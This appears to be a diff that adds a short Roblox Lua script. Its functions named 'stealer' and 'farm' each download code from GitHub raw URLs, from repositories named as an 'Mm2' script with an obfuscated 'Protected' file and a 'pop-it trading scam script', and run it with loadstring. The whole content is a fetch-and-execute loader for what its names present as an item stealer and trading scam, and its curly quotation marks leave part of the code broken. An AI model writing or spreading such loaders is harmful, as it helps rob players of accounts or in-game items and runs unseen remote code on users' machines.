@@ -1,0 +1,10 @@
+local function stealer()
+
+loadstring(game:HttpGet(“https://raw.githubusercontent.com/kingspeaks/Mm2-best-script/refs/heads/main/Protected_7886531746442238.lua.txt”))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/refs/heads/main/.gitignore”))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
